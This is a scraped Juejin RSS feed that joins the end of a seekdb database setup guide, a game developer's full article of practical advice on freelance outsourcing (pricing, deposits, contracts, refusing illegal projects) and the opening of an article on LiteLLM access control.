<span class="hljs-attr">log_disk_size</span>=<span class="hljs-number">2</span>G
</code></pre>
<p><strong>启动与管理 seekdb：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动 seekdb</span>
sudo systemctl start seekdb

<span class="hljs-comment"># 查看启动状态 (显示 Service is ready 即成功)</span>
sudo systemctl status seekdb

<span class="hljs-comment"># 连接 seekdb</span>
obclient -h127.0.0.1 -uroot -P1234 -A oceanbase

<span class="hljs-comment"># 停止服务</span>
sudo systemctl stop seekdb

<span class="hljs-comment"># 开机启动</span>
sudo systemctl <span class="hljs-built_in">enable</span> seekdb
</code></pre>
<h3 data-id="heading-8">2. 嵌入式安装</h3>
<p>seekdb 提供了嵌入式部署方式，可以作为一个“库”运行在你的应用程序内部。</p>
<p><strong>Python 示例</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> seekdb

<span class="hljs-comment"># Open a database</span>
seekdb.<span class="hljs-built_in">open</span>()

<span class="hljs-comment"># Connect to a database</span>
conn = seekdb.connect()

<span class="hljs-comment"># Use the connection</span>
cursor = conn.cursor()
cursor.execute(<span class="hljs-string">"select version();"</span>)
results = cursor.fetchall()
<span class="hljs-built_in">print</span>(results)

<span class="hljs-comment"># Close the connection</span>
conn.close()
</code></pre>
<p><strong>运行结果</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ python3 sample.py
[(<span class="hljs-string">'1.2.34-OceanBase NewProduct-v5.6.7.8'</span>,)]
</code></pre>
<h3 data-id="heading-9">3. 其他部署方式</h3>
<p>除此之外，OB 官方还提供了 seekdb 的 Docker 镜像和桌面版管理工具，篇幅有限这里就不展开介绍了，感兴趣的同学可以移步文档查看（oceanbase.ai/docs）。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d85b5dd0eb994f4c809fa11de6b8d15d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=n4lTC1Ft929%2BUSddEHzXLziw%2FMc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">0xFF. 写在最后</h2>
<p>回想去年，我第一次用 OceanBase 数据库做 RAG 应用，当时用 16GB 内存的 MacBook Pro 启动 OB 竟然还会因为内存不够而失败☹️，那时候的 OB 强大却略显“高冷”。</p>
<p>而 seekdb 的出现，让我有一种“士别三日当刮目相看”的感觉。OceanBase 从昔日“高不可攀”的金融级数据库，到如今“触手可及”的 seekdb，OceanBase 团队这次真正看懂了开发者在 AI 时代对数据库期望的样子：无痛的上手体验，不吃资源、配置简单、开箱即用，却依然强大可靠。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f28ced87a97448884d366a67c63a2fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=BM9NWjZsJcEfZkpIo0Qd%2BNx9O48%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>GitHub 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fseekdb" target="_blank" title="https://github.com/oceanbase/seekdb" ref="nofollow noopener noreferrer">github.com/oceanbase/s…</a></p>
</blockquote>
<p>现在的 seekdb 也许还不是“最终形态”，但它绝对是一个令人兴奋的起点，让我们一起见证这款“更懂 AI 的数据库”成长之路。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[游戏外包该不该接，怎么接，去哪里接？]]></title>    <link>https://juejin.cn/post/7576155790164836403</link>    <guid>https://juejin.cn/post/7576155790164836403</guid>    <pubDate>2025-11-25T00:31:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576155790164836403" data-draft-id="7575442779039645738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="游戏外包该不该接，怎么接，去哪里接？"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-25T00:31:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="亿元程序员"/> <meta itemprop="url" content="https://juejin.cn/user/1972988307323236"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            游戏外包该不该接，怎么接，去哪里接？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972988307323236/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    亿元程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:31:05.000Z" title="Tue Nov 25 2025 00:31:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>点击上方亿元程序员+关注和★星标</p>
<h2 data-id="heading-0">引言</h2>
<p><strong>哈喽大家好</strong>，相信小伙伴们或多或少都有过下面几种外包经历：</p>
<ul>
<li><strong>接外包</strong>：帮客户完成指定功能内容。</li>
<li><strong>发外包</strong>：找人帮忙完成指定功能内容。</li>
<li><strong>转外包</strong>：帮客户找人完成指定功能内容。</li>
</ul>
<p><strong>笔者</strong>也不例外，自从开始写公众号以来，陆陆续续有小伙伴找笔者定制游戏、接入功能、优化项目等等。</p>
<p><strong>关于</strong>游戏外包大家肯定也有很多的疑问，例如：</p>
<ul>
<li><strong>该不该接</strong>：外包能不能接，有什么坑等等。</li>
<li><strong>怎么接</strong>：关于外包定价，如何防止扯皮等等。</li>
<li><strong>去哪里接</strong>：哪里可以接到外包。</li>
</ul>
<p><strong>言归正传</strong>，本期笔者给大家整理了关于以上疑问的相关看法，大家可以了解或者补充一下，如果对你或你的小伙伴有帮助，可以<strong>点赞</strong>和<strong>爱心</strong>和<strong>分享</strong>三连哦~</p>
<h2 data-id="heading-1">该不该接</h2>
<p><strong>首先</strong>第一步肯定是要评估这个外包，到底能不能接，可以通过以下几个方面判断：</p>
<h3 data-id="heading-2">1.会不会</h3>
<p><strong>就是</strong>你要评估你们团队能不能完成这个需求，至少内容是符合你的专业技能，这个需求需要花多少时间，是否有档期。</p>
<p><strong>如果</strong>你对这个需求是否能完成，模棱两可，那建议你就不要接，因为你没办法完整准确评估，有很多坑你可能预知不到，例如遇到需求不明确的，前期三五个模块结果后续越来越多变成十几个。又或者估价<code>3个w</code>的项目，最后可能要花<code>10个w</code>等等。</p>
<p><strong>但是</strong>你实在想接这种外包(懂一点，刚入门，实在缺)，那你也可以尝试一下，不过就是有点儿坑客户了，不过对方愿意即可。</p>
<h3 data-id="heading-3">2.能不能</h3>
<p><strong>如果</strong>有涉及以下情况的项目，建议直接拒绝，头也不回。</p>
<ul>
<li><strong>棋牌/赌博</strong>：不管是够国内海外，都不能接，这个是涉及违法的内容。</li>
<li>**“黄色”**项目：这个和上面的一样，坚决不能碰。</li>
<li><strong>破解</strong>：侵犯知识产权、计算机著作权等等，不能接。</li>
<li><strong>诈骗</strong>：让你飞出国的，不能接。</li>
</ul>
<p><strong>这里面</strong>涉及一个严重的问题，就是“帮信”的问题，笔者特意去查了下：</p>
<blockquote>
<p>1.明知他人在利用信息网络实施犯罪。</p>
<p>2.情节严重。</p>
</blockquote>
<p><strong>关于</strong>明知的这个条件，可能会比较模糊，但是很多时候，你一看项目或者听到项目的描述就应该知道涉及灰色领域，这个时候如果说你不知道，一般是不行的。</p>
<p><strong>情节严重</strong>包含以下几种：</p>
<ul>
<li>1.获利1万以上。</li>
<li>2.流水达到20万。</li>
<li>3.帮助了3个或以上的犯罪份子。</li>
</ul>
<p><strong>总的来说</strong>，这类情况只要你感到奇怪、不舒服、犹豫不决，那就不能接。</p>
<h3 data-id="heading-4">3.值不值</h3>
<p><strong>对于</strong>喜欢画饼的，为爱发电的，这种就得看值不值了。</p>
<p><strong>且不说</strong>外包，现在连入职到公司工作的，都有不发工资，只发大饼的，实在让人匪夷所思。</p>
<p><strong>就算是</strong>现实中认识的，也千万别碍于面子强行接下来，这样你会一直很痛苦的。</p>
<h2 data-id="heading-5">怎么接</h2>
<h3 data-id="heading-6">1.定价</h3>
<p><strong>首先</strong>外包其实就是用额外的时间换取额外的收益的过程，你需要投入人力和时间，所以总的原则就是，按照自己的“成本”，和想要获得多少利润率去估。</p>
<p><strong>个人成本</strong>，就是你的能力、水平以及名气，其实刚接触的小伙伴可以直接根据自己的<code>日薪 * 预估天数</code>来估价，然后看对方的情况决定增减百分比。</p>
<p><strong>如果</strong>你的名气在业内鼎鼎有名，或者单子已经有很多了，可以稍微溢价一部分。</p>
<h3 data-id="heading-7">2.定金</h3>
<p><strong>定金</strong>一般是对自己的一个保障，防止被白嫖或者客户中途说不干了，一般是总数的<code>30%</code>，假如你强势一点，还可以<code>40%</code>、<code>50%</code>，更重要的是，有定金才有动力，不然和画饼没有区别。</p>
<h3 data-id="heading-8">3.防止扯皮</h3>
<p><strong>防止扯皮</strong>的最主要办法就是沟通，在最开始沟通的时候就需要明确需求、周期和定价交付。拒绝模棱两可的需求。在外包过程中遇到的问题，及时与客户沟通，避免快到验收了，发现问题不可调和，或者说要加钱，那就很不愉快了。</p>
<p><strong>此外</strong>还有一个必要的操作就是签合同，不管双方是个人还是公司，只要金额够大，都建议签合同，合同内容一般要明确：</p>
<ul>
<li><strong>开发目的</strong></li>
<li><strong>开发内容</strong></li>
<li><strong>交付进度和时间</strong></li>
<li><strong>价格与付款方式</strong></li>
<li><strong>保证合法合规</strong></li>
<li><strong>...</strong></li>
</ul>
<p><strong>详细</strong>的合同范例，可以私信发送"<strong>合同</strong>"获取网友分享的合同范例文件。</p>
<h2 data-id="heading-9">去哪里接</h2>
<p><strong>一般</strong><code>4</code>位数以下的外包的流程是这样：<code>开始-&gt;客户找到你-&gt;你和客户沟通需求和交付-&gt;收定金-&gt;你开始按照需求实现并完成—&gt;客户验收-&gt;验收通过打尾款-&gt;后续维护相关事宜-&gt;结束。</code></p>
<p><strong>所以</strong>一般外包都是别人找到你，你才有机会，所以你要做的是提高你的知名度，然后表达出你要接外包的意图，途径有很多，包括但不局限于个人博客、网站、公众号等等自媒体。</p>
<p><strong>那</strong>为什么不找别人，反而找你？那你就需要不断积累项目案例，越多成功的案例，更容易获得客户的信赖。</p>
<p><strong>那有</strong>小伙伴就问了，与其被动地等待，不如主动出击，时下不是很多外包平台吗？</p>
<p><strong>不为人知的内幕</strong>：平台的外包一般都是给很有实力的团队垄断了，剩下来的可能都是<code>N包</code>了，能接下来的都是苦力活了。</p>
<p><strong>那么</strong><code>5、6</code>位数以上的大单还有机会接到吗？这种在你的知名度起来之前，估计是很难的。就好像最近在论坛看到的，有个很有实力的大佬接到了<code>50个w</code>的外包，也都是现实中认识的老板给的。</p>
<p><strong>所以</strong>这就是为什么你接到的都是几百上千、别人的都是<code>5、6</code>位数的原因了。</p>
<h2 data-id="heading-10">结语</h2>
<p><strong>综合以上内容</strong>，除非真的很缺，要不然能不接外包就不接，因为真的是<strong>钱少、事多、催款难</strong>。</p>
<p><strong>你觉得呢？</strong></p>
<p><strong>我是"亿元程序员"，一位有着8年游戏行业经验的主程。在游戏开发中，希望能给到您帮助, 也希望通过您能帮助到大家。</strong></p>
<p>AD:笔者线上的小游戏《打螺丝闯关》《贪吃蛇掌机经典》《重力迷宫球》《填色之旅》《方块掌机经典》大家可以自行点击搜索体验。</p>
<p>实不相瞒，想要个<strong>赞</strong>和<strong>爱心</strong>！请把该文章<strong>分享</strong>给你觉得有需要的其他小伙伴。谢谢！</p>
<p>推荐专栏：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzg5NTY2MjIzMg%3D%3D%26action%3Dgetalbum%26album_id%3D3175880857546129410%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTY2MjIzMg==&amp;action=getalbum&amp;album_id=3175880857546129410#wechat_redirect" ref="nofollow noopener noreferrer">知识付费专栏</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg5NTY2MjIzMg%3D%3D%26mid%3D2247487282%26idx%3D1%26sn%3De3cb8ab6f5c0d5f804d5c29e2e90b9ad%26chksm%3Dc00daec5f77a27d33933e877464d8cde24c4c947d3755f5e8262c634634617e7c26de3953a54%26token%3D336413522%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg5NTY2MjIzMg==&amp;mid=2247487282&amp;idx=1&amp;sn=e3cb8ab6f5c0d5f804d5c29e2e90b9ad&amp;chksm=c00daec5f77a27d33933e877464d8cde24c4c947d3755f5e8262c634634617e7c26de3953a54&amp;token=336413522&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">你知道和不知道的微信小游戏常用API整理，赶紧收藏用起来~</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzg5NTY2MjIzMg%3D%3D%26action%3Dgetalbum%26album_id%3D3207702867494305797%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTY2MjIzMg==&amp;action=getalbum&amp;album_id=3207702867494305797#wechat_redirect" ref="nofollow noopener noreferrer">100个Cocos实例</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzg5NTY2MjIzMg%3D%3D%26action%3Dgetalbum%26album_id%3D3073771187570999299%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTY2MjIzMg==&amp;action=getalbum&amp;album_id=3073771187570999299#wechat_redirect" ref="nofollow noopener noreferrer">8年主程手把手打造Cocos独立游戏开发框架</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzg5NTY2MjIzMg%3D%3D%26action%3Dgetalbum%26album_id%3D3121583619634626562%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTY2MjIzMg==&amp;action=getalbum&amp;album_id=3121583619634626562#wechat_redirect" ref="nofollow noopener noreferrer">和8年游戏主程一起学习设计模式</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3Faction%3Dgetalbum%26__biz%3DMzg5NTY2MjIzMg%3D%3D%26scene%3D1%26album_id%3D3038883468588089350%26count%3D3%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&amp;__biz=Mzg5NTY2MjIzMg==&amp;scene=1&amp;album_id=3038883468588089350&amp;count=3#wechat_redirect" ref="nofollow noopener noreferrer">从零开始开发贪吃蛇小游戏到上线系列</a></p>
<p>点击下方灰色按钮+关注。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学习 LiteLLM 的访问控制]]></title>    <link>https://juejin.cn/post/7576187677838557199</link>    <guid>https://juejin.cn/post/7576187677838557199</guid>    <pubDate>2025-11-25T00:37:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576187677838557199" data-draft-id="7576130918078152739" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学习 LiteLLM 的访问控制"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-25T00:37:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="日习一技"/> <meta itemprop="url" content="https://juejin.cn/user/3913917125896190"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学习 LiteLLM 的访问控制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3913917125896190/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    日习一技
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.1 初学乍练
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.1 初学乍练" title="VIP.1 初学乍练" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:37:23.000Z" title="Tue Nov 25 2025 00:37:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前两篇文章中，我们深入探讨了 LiteLLM 的认证机制和用户管理体系，认证机制解决了 <strong>你是谁</strong> 的问题，用户管理则从组织、团队到用户的多层架构，以及基于角色的访问控制（RBAC）模型解决的是 <strong>你能做什么</strong> 的问题。</p>
<p>而今天我们要学习的访问控制机制则是用户管理的延续，从更细的粒度控制用户的行为，没有适当的访问控制，你的 LLM 网关可能会面临很多风险，比如：用户访问了不应该访问的模型，导致成本失控；恶意用户滥用 API，造成拒绝服务攻击；缺乏配额管理，导致某些用户耗尽所有资源。</p>
<p>LiteLLM 提供了一套完整的访问控制机制：</p>
<ol>
